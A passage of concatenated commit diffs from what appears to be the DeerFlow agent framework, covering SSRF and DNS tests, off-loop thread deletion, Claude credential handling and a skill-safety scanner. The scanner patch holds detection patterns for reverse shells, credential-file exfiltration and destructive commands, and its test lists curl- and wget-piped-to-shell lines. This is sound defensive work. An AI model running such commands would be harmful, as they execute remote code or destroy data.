+            assert family in (socket.AF_UNSPEC, socket.AF_INET), f"unsupported address family: {family}"
+            calls.append(host)
+            return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", ("127.0.0.1", port or 0))]
+        return native_getaddrinfo(host, port, family, *args, **kwargs)
+
+    # Patch below socket.getaddrinfo, not over Blockbuster's instrumented wrapper.
+    monkeypatch.setattr(_socket, "getaddrinfo", getaddrinfo)
+    return calls
+
+
+async def test_loopback_dns_keeps_on_loop_resolution_blocked(loopback_dns: list[str]) -> None:
+    with pytest.raises(BlockingError, match="socket.getaddrinfo"):
+        resolve_host_addresses(_LOOPBACK_HOST)
+
+    assert loopback_dns == []
+
+
+@pytest.mark.parametrize("family", [socket.AF_UNSPEC, socket.AF_INET])
+async def test_loopback_dns_accepts_ipv4_compatible_families(loopback_dns: list[str], family: int) -> None:
+    addresses = await asyncio.to_thread(socket.getaddrinfo, _LOOPBACK_HOST, 80, family, socket.SOCK_STREAM)
+
+    assert addresses == [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", ("127.0.0.1", 80))]
+    assert loopback_dns == [_LOOPBACK_HOST]
+
+
+async def test_loopback_dns_rejects_ipv6_requests(loopback_dns: list[str]) -> None:
+    with pytest.raises(AssertionError, match="unsupported address family"):
+        await asyncio.to_thread(socket.getaddrinfo, _LOOPBACK_HOST, 80, socket.AF_INET6, socket.SOCK_STREAM)
+
+    assert loopback_dns == []
+
+
+async def test_crawl4ai_web_fetch_resolves_off_loop(loopback_dns: list[str]) -> None:
     with (
         patch.object(crawl4ai_tools, "_get_tool_config", return_value={}),
         patch.object(crawl4ai_tools, "_build_client") as build_client,
     ):
         result = await crawl4ai_tools.web_fetch_tool.ainvoke({"url": _UNRESOLVED_LOOPBACK_URL})
 
     assert result == "Error: Refusing to fetch a private, loopback, or metadata address"
+    assert loopback_dns == [_LOOPBACK_HOST]
     build_client.assert_not_called()
 
 
-async def test_browserless_web_fetch_resolves_off_loop() -> None:
+async def test_browserless_web_fetch_resolves_off_loop(loopback_dns: list[str]) -> None:
     with (
         patch.object(browserless_tools, "_get_tool_config", return_value={}),
         patch.object(browserless_tools, "_get_browserless_client") as get_client,
     ):
         result = await browserless_tools.web_fetch_tool.ainvoke({"url": _UNRESOLVED_LOOPBACK_URL})
 
     assert result == "Error: Refusing to fetch a private, loopback, or metadata address"
+    assert loopback_dns == [_LOOPBACK_HOST]
     get_client.assert_not_called()
 
 
-async def test_browserless_web_capture_resolves_off_loop() -> None:
+async def test_browserless_web_capture_resolves_off_loop(loopback_dns: list[str]) -> None:
     with (
         patch.object(browserless_tools, "_get_tool_config", return_value={}),
         patch.object(browserless_tools, "_get_browserless_client") as get_client,
@@ -56,10 +102,11 @@ async def test_browserless_web_capture_resolves_off_loop() -> None:
         )
 
     assert result.update["messages"][0].content == "Error: Refusing to capture a private, loopback, or metadata address"
+    assert loopback_dns == [_LO
```

---

### Incident Patch 5: `0223d949` (2026-10-05)
**Commit Message**: fix(threads): remove a deleted thread's files off the event loop (#6319)

* fix(threads): remove a deleted thread's files off the event loop

DELETE /api/threads/{id} called shutil.rmtree over the thread directory
directly on the event loop, so deleting a thread with a large workspace
stalled every other Gateway request and live SSE stream until the whole
tree was gone. Branch copying in the same router already offloads its
filesystem work through run_file_io; deletion did not.

The removal now runs on the file-IO pool. It is wrapped in await_drained
rather than bare-awaited: cancelling the await abandons the worker, not
the removal, so the durable delete reservation would otherwise release
while files are still being deleted, and a newly admitted run could
write into a directory that is about to disappear.

* docs(changelog): reference #6319 in the thread delete off-loop entry

---------

Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `CHANGELOG.md` (modified, +9/-0)
```diff
@@ -466,6 +466,14 @@ This release closes that milestone with **301 merged pull requests**.
 
 ### Fixed
 
+- **gateway:** Deleting a thread with a large workspace no longer freezes every
+  other Gateway request while its files are removed. `DELETE /api/threads/{id}`
+  ran `shutil.rmtree` over the thread directory on the event loop, so other
+  requests and live SSE streams stalled until the whole tree was gone (about
+  0.7 seconds for 20,000 small files on a local SSD, longer on mounted
+  volumes). The removal now runs on the file-IO pool, and a cancelled request
+  keeps its thread reservation until the removal finishes, so no new run can
+  start on a thread whose files are still being deleted. ([#6319])
 - **sandbox:** Medium-risk audit warnings no longer hide a failed shell exit from
   subagent evidence. `SandboxAuditMiddleware` appended its warning after the
   trailing `Exit Code: N` marker and rebuilt the `ToolMessage` from four fields,
@@ -7766,3 +7774,4 @@ with **180 merged pull requests** since the first 2.0 milestone tag.
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
 [#6306]: https://github.com/bytedance/deer-flow/pull/6306
 [#6307]: https://github.com/bytedance/deer-flow/pull/6307
+[#6319]: https://github.com/bytedance/deer-flow/pull/6319
```

**File**: `CHANGELOG_zh.md` (modified, +6/-0)
```diff
@@ -423,6 +423,11 @@
 
 ### 修复
 
+- **网关：** 删除工作区较大的线程时，移除文件期间不再冻结 Gateway 的其他所有请求。
+  `DELETE /api/threads/{id}` 此前在事件循环上对线程目录执行 `shutil.rmtree`，
+  因此其他请求与进行中的 SSE 流都要等到整棵目录树删除完毕（本地 SSD 上 20,000 个
+  小文件约 0.7 秒，挂载卷上更久）。现在移除在文件 IO 线程池中执行；请求被取消时，
+  线程预留会保持到移除完成，因此文件仍在删除的线程上不会启动新的运行。([#6319])
 - **沙箱：** 中风险审计警告不再让子智能体证据丢失失败的 shell 退出码。
   `SandboxAuditMiddleware` 原先把警告追加在结尾的 `Exit Code: N` 标记之后，并只用
   四个字段重建 `ToolMessage`，导致 `_bash_evidence_status` 找不到标记，退回到报告
@@ -6478,3 +6483,4 @@ DeerFlow 2.0 是围绕"超级智能体"框架的彻底重写，核心包含子
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
 [#6306]: https://github.com/bytedance/deer-flow/pull/6306
 [#6307]: https://github.com/bytedance/deer-flow/pull/6307
+[#6319]: https://github.com/bytedance/deer-flow/pull/6319
```

**File**: `backend/app/gateway/AGENTS.md` (modified, +1/-1)
```diff
@@ -198,7 +198,7 @@ startup gate rejects process-local memory and JSONL event stores when
 - Run admission and independent writes are first-class thread operations. `runs.operation_kind` distinguishes `run` from `checkpoint_write`, `artifact_write`, `artifact_archive`, `branch`, and `delete`; every active kind shares the durable active-thread uniqueness constraint. New operation kinds must go through `RunStore.create_thread_operation_atomic()` and `RunManager.reserve_thread_operation()` rather than adding another lock or metadata marker. Live and lease-less reservations are non-interruptible; an expired leased reservation can be reclaimed immediately by interrupt/rollback admission without waiting for orphan reconciliation. Lease-less rows stay fail-closed because the store cannot distinguish a stale row from a live writer in another heartbeat-disabled worker; a rare failed delete therefore requires startup reconciliation, and heartbeat-disabled multi-worker deployment remains unsupported. Reservation bodies are attached to their caller task so loss detected by lease renewal cancels the writer before it can continue after takeover; the context manager translates that lease-loss cancellation to `ConflictError` after cleanup so Gateway mutation routes return a retryable 409 instead of dropping the HTTP request. The cleanup scope begins immediately after durable admission, including the await that attaches the caller task, so cancellation cannot strand a locally renewed pending reservation. A failed renewal is revalidated under the manager lock before cancellation; if the reservation completed and unregistered while the store update was in flight, its request task must not be cancelled after the write. Reservations are excluded from run history/reporting and from run-only helpers such as `list_by_thread()` and `has_inflight()`, release uses the captured owner rather than ambient user context, and local cleanup still runs when the best-effort store delete fails. `RunStore.create_run_atomic()` remains a deprecated compatibility shim for external stores that only admit normal runs; new stores must implement `create_thread_operation_atomic()` to support internal operation kinds.
 - Gateway checkpoint mutations outside run execution must use `services.reserve_checkpoint_write()`, which composes the process-local thread lock with the durable `checkpoint_write` reservation. Manual compaction, `POST /threads/{id}/state`, and both goal mutation routes (`PUT` / `DELETE /threads/{id}/goal`, including creation of a missing goal checkpoint) use this boundary, so an existing run blocks the write and the reservation blocks new reject/interrupt/rollback runs across workers.
 - Branch/state-update checkpoints copy only the source checkpoint's persisted `deerflow_agent_name`, never request metadata; missing or malformed bindings stay unbound so compaction fails closed.
-- `DELETE /api/threads/{id}` holds a durable `delete` reservation for the whole cleanup and removes thread filesystem data, checkpoints, owner-scoped historical runs, run events, feedback and thread metadata best-effort. Historical-run cleanup removes only `operation_kind="run"` rows, so internal thread-operation rows — including the reservation protecting that request — stay durable until `RunManager.reserve_thread_operation()` exits. This cleans persisted rows; preventing an already-admitted write from re-creating state for a deleted thread is a separate thread-incarnation contract, not part of this cleanup.
+- `DELETE /api/threads/{id}` holds a durable `delete` reservation for the whole cleanup and removes thread filesystem data (off-loop, drained on cancel), checkpoints, owner-scoped historical runs, run events, feedback and thread metadata best-effort. Historical-run cleanup removes only `operation_kind="run"` rows, so internal thread-operation rows — including the reservation protecting that request — stay durable until `RunManager.reserve_thread_operation()` exits. This cleans persisted rows; preventing an already-admitted write from re-creating state for a deleted thread is a separate thread-incarnation contract, not part of this cleanup.
 - Creator SSE and `/wait` apply `on_disconnect` only to confirmed request disconnect or cancellation; bridge failures propagate without cancelling the run. `/wait` consumes bridge END; errors return SDK `__error__`, never stale state.
 - Memory and Redis `StreamBridge` implementations retain only `stream_bridge.queue_maxsize` data events. A syntactically valid `Last-Event-ID` older than the retained watermark, or a live subscriber that falls behind it, yields `StreamGap` before any partial replay. `sse_consumer` maps that control item to an id-less SSE `gap` payload (`stream_replay_gap`) and intentionally leaves the run active; internal `/wait` consumers resume from its latest retained ID because they only need terminal completion. Redis checks bounds plus the non-blocking read in one transaction, using blocking `XREAD
```

**File**: `backend/app/gateway/routers/threads.py` (modified, +6/-2)
```diff
@@ -73,7 +73,7 @@
 from deerflow.runtime.secret_context import redact_metadata_secrets
 from deerflow.runtime.user_context import get_effective_user_id
 from deerflow.uploads.companions import register_companion, resolve_companion
-from deerflow.utils.file_io import run_file_io
+from deerflow.utils.file_io import await_drained, run_file_io
 from deerflow.utils.thread_id import ThreadId, resolve_thread_id, validate_thread_id
 from deerflow.utils.time import coerce_iso, now_iso
 
@@ -778,7 +778,11 @@ async def _delete_thread_data_with_reservation(thread_id: str, request: Request)
             message="Skipped local data cleanup for legacy thread ID",
         )
     else:
-        response = _delete_thread_data(thread_id, user_id=user_id)
+        # rmtree over a large workspace must not stall the loop. Drained, not
+        # bare-awaited: cancelling the await abandons the worker, not the
+        # removal, so the reservation would release while files are still
+        # being deleted under a run that has just been admitted.
+        response = await await_drained(run_file_io(_delete_thread_data, thread_id, user_id=user_id))
 
     # Remove checkpoints (best-effort)
     checkpointer = getattr(request.app.state, "checkpointer", None)
```

**File**: `backend/tests/blocking_io/test_threads_delete.py` (added, +60/-0)
```diff
@@ -0,0 +1,60 @@
+"""Regression anchor: deleting a thread must not block the event loop.
+
+``DELETE /api/threads/{id}`` removes the thread's whole directory tree
+(workspace, uploads, outputs). ``shutil.rmtree`` over a large workspace
+stalls every other request on the Gateway loop, so the handler offloads it
+via ``run_file_io``; if the removal regresses onto the event loop, the strict
+Blockbuster gate raises ``BlockingError``, the handler maps it to a 500, and
+this test fails.
+
+The handler is driven through ``__wrapped__`` (past the authz decorator) so
+the goal lock, the thread-operation reservation and every cleanup step run as
+in production. Imports live at module scope so their file reads happen at
+collection time, not on the loop under test; test-side seeding and checks are
+offloaded with ``asyncio.to_thread``.
+"""
+
+from __future__ import annotations
+
+import asyncio
+from contextlib import asynccontextmanager
+from pathlib import Path
+from types import SimpleNamespace
+from unittest.mock import patch
+
+import pytest
+
+from app.gateway.routers import threads
+from deerflow.config.paths import Paths
+from deerflow.runtime.user_context import get_effective_user_id
+
+pytestmark = pytest.mark.asyncio
+
+
+class _RunManager:
+    @asynccontextmanager
+    async def reserve_thread_operation(self, _thread_id: str, **_kwargs):
+        yield
+
+
+def _seed_workspace(paths: Paths, thread_id: str, user_id: str) -> Path:
+    paths.ensure_thread_dirs(thread_id, user_id=user_id)
+    workspace = paths.sandbox_work_dir(thread_id, user_id=user_id)
+    for index in range(20):
+        (workspace / f"file-{index}.txt").write_text("content", encoding="utf-8")
+    return paths.thread_dir(thread_id, user_id=user_id)
+
+
+async def test_delete_thread_does_not_block_event_loop(tmp_path: Path) -> None:
+    user_id = get_effective_user_id()
+    # test-side setup and seeding (offloaded; not exercised on the loop)
+    paths = await asyncio.to_thread(Paths, tmp_path)
+    thread_dir = await asyncio.to_thread(_seed_workspace, paths, "thread-loop-delete", user_id)
+    request = SimpleNamespace(app=SimpleNamespace(state=SimpleNamespace(run_manager=_RunManager(), checkpointer=None)))
+
+    with patch("app.gateway.routers.threads.get_paths", return_value=paths):
+        response = await threads.delete_thread_data.__wrapped__("thread-loop-delete", request)
+
+    assert response.success is True
+    assert response.message == "Deleted local thread data for thread-loop-delete"
+    assert not await asyncio.to_thread(thread_dir.exists)
```

**File**: `backend/tests/test_threads_router.py` (modified, +50/-0)
```diff
@@ -1,5 +1,6 @@
 import asyncio
 import re
+import threading
 from contextlib import asynccontextmanager
 from types import SimpleNamespace
 from unittest.mock import AsyncMock, MagicMock, patch
@@ -747,6 +748,55 @@ async def reserve_thread_operation(self, _thread_id: str, **_kwargs):
     assert asyncio.run(store.aget(THREADS_NS, "thread-active-delete")) is not None
 
 
+def test_delete_thread_route_holds_reservation_until_cancelled_removal_finishes(tmp_path):
+    """A cancelled delete must not release its reservation mid-rmtree.
+
+    The removal runs on a file-IO worker. Cancelling the request abandons the
+    await, not the worker, so a bare await would let ``reserve_thread_operation``
+    exit -- and admit a new run on the thread -- while its files are still
+    being deleted. The stalled removal below makes that window observable.
+    """
+    events: list[str] = []
+    removal_started = threading.Event()
+    release_removal = threading.Event()
+
+    class RecordingRunManager(_ThreadTestRunManager):
+        @asynccontextmanager
+        async def reserve_thread_operation(self, _thread_id: str, **_kwargs):
+            try:
+                yield
+            finally:
+                events.append("reservation released")
+
+    def stalled_delete_thread_dir(_thread_id, *, user_id=None):
+        removal_started.set()
+        release_removal.wait(timeout=5)
+        events.append("removal finished")
+
+    paths = Paths(tmp_path)
+    request = SimpleNamespace(app=SimpleNamespace(state=SimpleNamespace(run_manager=RecordingRunManager(), checkpointer=None)))
+
+    async def scenario() -> None:
+        task = asyncio.create_task(threads.delete_thread_data.__wrapped__("thread-cancelled-delete", request))
+        assert await asyncio.to_thread(removal_started.wait, 5)
+        task.cancel()
+        await asyncio.sleep(0.05)
+        # Cancellation is deferred while the removal is still running.
+        assert not task.done()
+        assert events == []
+        release_removal.set()
+        with pytest.raises(asyncio.CancelledError):
+            await task
+
+    with (
+        patch("app.gateway.routers.threads.get_paths", return_value=paths),
+        patch.object(paths, "delete_thread_dir", side_effect=stalled_delete_thread_dir),
+    ):
+        asyncio.run(scenario())
+
+    assert events == ["removal finished", "reservation released"]
+
+
 def test_branch_thread_route_rejects_concurrent_source_operation_without_creating_child():
     class RejectingRunManager(_ThreadTestRunManager):
         @asynccontextmanager
```

---

### Incident Patch 6: `9f8a59da` (2026-10-05)
**Commit Message**: fix(models): skip undecodable Claude descriptor handoffs (#6323)

**File**: `README.md` (modified, +1/-0)
```diff
@@ -311,6 +311,7 @@ For Google's official Gemini OpenAI-compatible endpoint, use the
    - Codex CLI reads `~/.codex/auth.json`
    - The Codex model provider returns completed responses without waiting for the SSE connection to close. Failed or incomplete responses report the provider's error or reason; partial output is not returned as a successful answer. Non-object error details are reported as text.
    - Claude Code accepts `CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_AUTH_TOKEN`, `CLAUDE_CODE_CREDENTIALS_PATH`, or `~/.claude/.credentials.json`
+   - `CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR` accepts a UTF-8 token handoff and reuses it for later model instances in the same process. Undecodable handoffs are skipped so Claude Code can still try its override or default credentials file.
    - CLI credential JSON files accept UTF-8 with or without a BOM, independently of the host locale. `make doctor` accepts the same files when checking CLI authentication. Invalid text encoding is treated as an unreadable source; Claude Code can still try its default file after an invalid override.
    - ACP agent entries are separate from model providers — if you configure `acp_agents.codex`, point it at a Codex ACP adapter such as `npx -y @zed-industries/codex-acp`
    - Each ACP agent's `timeout_seconds` (default: 1800) is one shared budget for initialization, session creation, and the prompt, starting after the subprocess launches. On timeout, DeerFlow aborts the invocation and closes the subprocess before returning an error. Workspace/MCP preparation and subprocess cleanup are outside this budget. A `TimeoutError` raised by the SDK before this deadline expires retains its own error message.
```

**File**: `backend/packages/harness/deerflow/models/AGENTS.md` (modified, +1/-1)
```diff
@@ -90,7 +90,7 @@ Offline HTTP-stream coverage: `tests/test_codex_stream_terminal_events.py`.
 ### Claude Code Credentials (`packages/harness/deerflow/models/credential_loader.py`)
 
 - `ClaudeChatModel.model_post_init` calls `load_claude_code_credential()` for every instance, and `create_chat_model` builds fresh instances per run (lead agent, title, summarization, subagents)
-- `$CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR` is a one-shot handoff: a pipe returns EOF and a file keeps its advanced offset. `_read_secret_from_file_descriptor` therefore caches a non-empty secret per `(env_var, fd)` under a lock held across the read. Do not drop the cache or the lock — later instances would get no credential, and the Anthropic SDK raises `TypeError: Could not resolve authentication method` before sending. Empty reads and `OSError` are not cached. The key is the descriptor number on purpose — a closed handoff keeps serving its token, and a secret placed on a recycled number in-process is not re-read unless the cache is cleared. The cache is per process, so a new process (e.g. a uvicorn `--reload` worker) cannot recover a drained descriptor. Pinned by `tests/test_credential_loader.py`, including a two-instance `ClaudeChatModel` test
+- `$CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR` is a one-shot handoff: a pipe returns EOF and a file keeps its advanced offset. `_read_secret_from_file_descriptor` therefore caches a non-empty secret per `(env_var, fd)` under a lock held across the read. Do not drop the cache or the lock — later instances would get no credential, and the Anthropic SDK raises `TypeError: Could not resolve authentication method` before sending. Empty reads, `OSError`, and UTF-8 decode failures are not cached; unreadable handoffs return `None` so the loader can try credential files. Warnings must not include token contents. The key is the descriptor number on purpose — a closed handoff keeps serving its token, and a secret placed on a recycled number in-process is not re-read unless the cache is cleared. The cache is per process, so a new process (e.g. a uvicorn `--reload` worker) cannot recover a drained descriptor. Pinned by `tests/test_credential_loader.py` and `tests/test_claude_fd_encoding.py`, including two-instance `ClaudeChatModel` tests
 
 ### Claude Prompt Caching (`packages/harness/deerflow/models/claude_provider.py`)
 
```

**File**: `backend/packages/harness/deerflow/models/credential_loader.py` (modified, +1/-1)
```diff
@@ -117,7 +117,7 @@ def _read_secret_from_file_descriptor(env_var: str) -> str | None:
 
         try:
             secret = os.read(fd, 1024 * 1024).decode().strip()
-        except OSError as e:
+        except (OSError, UnicodeError) as e:
             logger.warning(f"Failed to read {env_var}: {e}")
             return None
 
```

**File**: `backend/tests/test_claude_fd_encoding.py` (added, +104/-0)
```diff
@@ -0,0 +1,104 @@
+import json
+import logging
+import os
+from collections.abc import Iterator
+from contextlib import contextmanager
+from pathlib import Path
+
+import pytest
+
+from deerflow.models import credential_loader
+from deerflow.models.claude_provider import ClaudeChatModel
+
+
+@pytest.fixture(autouse=True)
+def _isolate_credentials(tmp_path, monkeypatch):
+    for name in (
+        "CLAUDE_CODE_OAUTH_TOKEN",
+        "ANTHROPIC_AUTH_TOKEN",
+        "ANTHROPIC_API_KEY",
+        "CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR",
+        "CLAUDE_CODE_CREDENTIALS_PATH",
+    ):
+        monkeypatch.delenv(name, raising=False)
+    monkeypatch.setenv("HOME", str(tmp_path))
+    monkeypatch.setenv("USERPROFILE", str(tmp_path))
+    monkeypatch.setattr(credential_loader, "_fd_secret_cache", {})
+
+
+@contextmanager
+def _handoff(payload: bytes, monkeypatch) -> Iterator[int]:
+    read_fd, write_fd = os.pipe()
+    try:
+        try:
+            os.write(write_fd, payload)
+        finally:
+            os.close(write_fd)
+        monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR", str(read_fd))
+        yield read_fd
+    finally:
+        os.close(read_fd)
+
+
+def _credential_file(path: Path) -> Path:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(json.dumps({"claudeAiOauth": {"accessToken": "sk-ant-oat01-file-fallback"}}), encoding="utf-8")
+    return path
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [b"sk-ant-oat01-invalid-byte\xff", b"\xff\xfe" + "sk-ant-oat01-utf16".encode("utf-16-le"), b"sk-ant-oat01-truncated\xe2\x82"],
+    ids=["invalid-byte", "utf16", "truncated-utf8"],
+)
+@pytest.mark.parametrize("fallback", ["none", "override", "default"])
+def test_undecodable_descriptor_skips_to_file_credentials(tmp_path, monkeypatch, caplog, payload, fallback):
+    if fallback == "override":
+        monkeypatch.setenv("CLAUDE_CODE_CREDENTIALS_PATH", str(_credential_file(tmp_path / "override.json")))
+    elif fallback == "default":
+        _credential_file(tmp_path / ".claude" / ".credentials.json")
+
+    with caplog.at_level(logging.WARNING, logger=credential_loader.__name__), _handoff(payload, monkeypatch) as read_fd:
+        # A failed handoff must not strand either the first model or later loads.
+        credentials = [credential_loader.load_claude_code_credential() for _ in range(2)]
+        os.fstat(read_fd)  # The loader does not own or close the descriptor.
+
+    if fallback == "none":
+        assert credentials == [None, None]
+    else:
+        assert all(cred is not None and cred.access_token == "sk-ant-oat01-file-fallback" and cred.source == "claude-cli-file" for cred in credentials)
+    assert credential_loader._fd_secret_cache == {}
+    assert "Failed to read CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR" in caplog.text
+    assert "sk-ant-oat01" not in caplog.text
+
+
+def test_claude_models_use_file_fallback_after_undecodable_descriptor(tmp_path, monkeypatch):
+    _credential_file(tmp_path / ".claude" / ".credentials.json")
+
+    with _handoff(b"sk-ant-oat01-model-handoff\xff", monkeypatch):
+        models = [ClaudeChatModel(model="claude-sonnet-4-6") for _ in range(2)]
+
+    for model in models:
+        assert model._is_oauth is True
+        assert model._client.api_key is None
+        assert model._client.auth_token == "sk-ant-oat01-file-fallback"
+
+
+def test_valid_descriptor_still_wins_over_file_and_reuses_cached_token(tmp_path, monkeypatch):
+    _credential_file(tmp_path / ".claude" / ".credentials.json")
+
+    with _handoff(b"  sk-ant-oat01-valid-handoff\n", monkeypatch):
+        credentials = [credential_loader.load_claude_code_credential() for _ in range(2)]
+
+    assert all(cred is not None and cred.access_token == "sk-ant-oat01-valid-handoff" and cred.source == "claude-cli-fd" for cred in credentials)
+
+
+def test_direct_environment_token_precedes_undecodable_descriptor(monkeypatch, caplog):
+    monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "sk-ant-oat01-direct")
+
+    with _handoff(b"sk-ant-oat01-bad-handoff\xff", monkeypatch) as read_fd:
+        cred = credential_loader.load_claude_code_credential()
+        assert os.read(read_fd, 1024) == b"sk-ant-oat01-bad-handoff\xff"
+
+    assert cred is not None and cred.access_token == "sk-ant-oat01-direct" and cred.source == "claude-cli-env"
+    assert "Failed to read" not in caplog.text
```

---

### Incident Patch 7: `7abb973f` (2026-10-05)
**Commit Message**: fix(harness): detect shell pipe variants with sudo, full paths and other shells (#6312)

* fix(harness): detect shell pipe variants with sudo, full paths and other shells

The shell-curl-pipe-shell rule only matched the bare 'curl ... | bash'
spelling. The variants that real install scripts actually ship —
'sudo bash', 'sudo -E bash', '/bin/bash', 'zsh'/'dash'/'fish', and
line-continued pipes — produced no finding at all, so a HIGH-severity
remote-code-execution pattern went unreported (#6310 lists the table).

The pattern now tolerates an optional sudo/doas-style flag prefix, full
interpreter paths, and line continuations, and covers the common shell
names. Non-shell pipes (jq, tee) stay unreported.

Fixes #6310

* test(skillscan): restore lost parametrize decorator in merge resolution

* test(skillscan): fix indentation of the http_host parametrize block

* style: ruff-format the skillscan test file

* fix(skillscan): bound pipe matching and handle real continuations

* fix(skillscan): tolerate continuations between sudo, its flags and the shell

Verified undetected until now: `curl ... | sudo \
  bash` and the -E
variant (LF and CRLF). Whitespace runs inside the sudo segment use

**File**: `README.md` (modified, +2/-0)
```diff
@@ -1295,6 +1295,8 @@ If a trusted operator manages the configured skills directory through an externa
 
 Skill installs and agent-managed skill edits run through **SkillScan**, a native deterministic safety scanner before the LLM-based skill scanner. Phase 1 runs offline with no Semgrep/OpenGrep dependency, blocks high-confidence `CRITICAL` findings such as private keys or shell execution, and passes warning findings to the LLM scanner for contextual review. Code files (anything under `scripts/`, a script suffix such as `.py`, `.sh`, or `.js`, or an extensionless file starting with `#!`) that are not NUL-free UTF-8 text raise a warning and are still analyzed over a lossy decode, so a single stray byte cannot hide them from `CRITICAL` checks. The moderation adapter normalizes both plain-text model responses and LangChain Responses API text blocks before parsing the required JSON decision. Python instance-client exfiltration checks follow a minimal same-scope evidence chain: a simple name bound to a known client constructor, optional name-to-name aliases, and an actual outbound method or context-manager use supported by that constructor. Constructor roots must be proven imports; bare canonical-looking names are not inferred as modules. Nested scopes do not inherit client handles and inherit only constructor import aliases that are never rebound in the enclosing scope. Comprehensions, walrus-bearing statements, annotations, complex binding targets, unsupported operations, and ambiguous branch flows produce no finding from this signal; skipped constructs conservatively invalidate every name they may bind so stale client state cannot create a finding. A deterministic work budget or recursion limit reached by this best-effort analysis does not discard findings already collected for the file. Set `skill_scan.enabled: false` in `config.yaml` to disable only the deterministic analyzers; safe archive extraction and the LLM scanner still run.
 
+SkillScan warns about remote downloads piped into common shells, including sudo, interpreter paths, and shell line continuations. Pipes to non-shell tools such as `jq` and `tee` do not trigger this warning.
+
 SkillScan treats HTTP hostnames case-insensitively and recognizes bracketed IPv6
 loopback (`[::1]`) URLs as local. External IPv6 endpoints still trigger network findings,
 and cloud-metadata hostname detection is case-insensitive.
```

**File**: `backend/packages/harness/deerflow/skills/AGENTS.md` (modified, +2/-0)
```diff
@@ -1,5 +1,7 @@
 ### Skills System (`packages/harness/deerflow/skills/`)
 
+- **SkillScan shell pipes**: the `shell-curl-pipe-shell` warning covers sudo, common shell interpreter paths/names, and real backslash-newline continuations, including between `sudo`, its flags, and the interpreter. Keep repeated regex alternatives disjoint; failed matches on literal backslash text must not stall scanning. Value-bearing sudo flags (`sudo -u root bash`) are intentionally out of scope for this warning-level heuristic. Tests in `tests/test_skillscan_native.py` include a subprocess timeout regression and non-shell pipe controls.
+
 - **Integration package boundaries**: recurse through provider and namespace directories, but stop at each package's `SKILL.md`. Nested fixtures must neither become catalog entries nor shadow real public skills; regression coverage lives in `tests/test_user_scoped_skill_storage.py`.
 - **Location**: global public skills live under `deer-flow/skills/public/`; user-authored custom skills live under `{DEER_FLOW_HOME}/users/{user_id}/skills/custom/`; globally managed integration skills live under `{DEER_FLOW_HOME}/integrations/skills/{provider}/`; per-user integration credentials remain under `{DEER_FLOW_HOME}/users/{user_id}/integrations/{provider}/{config,data}`
 - **Format**: Directory with `SKILL.md` (YAML frontmatter: name, description, license, allowed-tools as a spec-compatible string or YAML list, argument-hint, required-secrets). Exact portable spellings such as `Bash`, `WebFetch`, `WebSearch`, `Glob`, `Grep`, `Read`, `Write`, and `Edit` map to `bash`, `web_fetch`, `web_search`, `glob`, `grep`, `read_file`, `write_file`, and `str_replace`; lowercase or otherwise unknown scalar names and YAML-list entries preserve their exact runtime spelling. Argument-scoped entries remain literal and inactive because the tool policy does not inspect arguments; the scalar tokenizer keeps spaces, quotes, and escaped parentheses inside patterns intact.
```

**File**: `backend/packages/harness/deerflow/skills/skillscan/orchestrator.py` (modified, +10/-1)
```diff
@@ -788,7 +788,16 @@ def _scan_shell(rel_path: str, text: str) -> list[SecurityFinding]:
         findings.append(_finding_from_match("shell-reverse-shell-heuristic", rel_path, text, match))
     if re.search(r"(/etc/shadow|/etc/passwd)", text) and re.search(r"\b(curl|wget|nc|scp)\b", text):
         findings.append(_finding_for_text("shell-sensitive-exfil", rel_path, text, "/etc"))
-    if match := re.search(r"\b(curl|wget)\b[^\n|;]*\|\s*(?:sh|bash)\b", text):
+    if match := re.search(
+        # Each repeated alternative consumes a distinct first character (or
+        # a backslash plus a distinct following character), avoiding nested
+        # overlapping repeats when a download command has no pipe.
+        r"\b(?:curl|wget)\b(?:[^\\\r\n|;]|\\\r?\n|\\[^\r\n])*"
+        r"\|(?:\s|\\\r?\n)*(?:sudo(?:\s|\\\r?\n)+"
+        r"(?:-\S+(?:\s|\\\r?\n)+)*?)?(?:/usr/(?:local/)?bin/|/bin/)?"
+        r"(?:bash|zsh|dash|fish|sh)\b",
+        text,
+    ):
         findings.append(_finding_from_match("shell-curl-pipe-shell", rel_path, text, match))
     if match := re.search(_DESTRUCTIVE_RM_RE + r"|:\(\)\{\s*:\|:&\s*\};:|dd\s+[^#\n]*\bof=/dev/", text):
         findings.append(_finding_from_match("shell-destructive-command", rel_path, text, match))
```

**File**: `backend/tests/test_skillscan_native.py` (modified, +74/-0)
```diff
@@ -2,6 +2,8 @@
 
 import io
 import os
+import subprocess
+import sys
 import zipfile
 from pathlib import Path
 from types import SimpleNamespace
@@ -1827,6 +1829,78 @@ def test_bundled_public_skill_scripts_report_no_secret_assignment() -> None:
     assert offenders == {}
 
 
+@pytest.mark.parametrize(
+    "snippet",
+    [
+        "curl -fsSL https://host/x.sh | bash",
+        "curl -fsSL https://host/x.sh | sudo bash",
+        "curl -fsSL https://host/x.sh | sudo -E bash",
+        "curl -fsSL https://host/x.sh | /bin/bash",
+        "curl -fsSL https://host/x.sh | zsh",
+        "curl -fsSL https://host/x.sh | dash",
+        "curl -fsSL https://host/x.sh | fish",
+        "curl -fsSL https://host/x.sh \\\n  | bash",
+        "curl -fsSL https://host/x.sh \\\n  | sudo bash",
+        "wget -qO- https://host/x.sh \\\n  | sudo -E /usr/bin/bash",
+        "curl -fsSL https://host/x.sh \\\r\n  | /usr/local/bin/sh",
+        "curl -fsSL https://host/x.sh | \\\n  sudo bash",
+        "curl -sO https://a; curl -s https://b | sudo bash",
+        "curl -fsSL https://host/x.sh | sudo \\\n  bash",
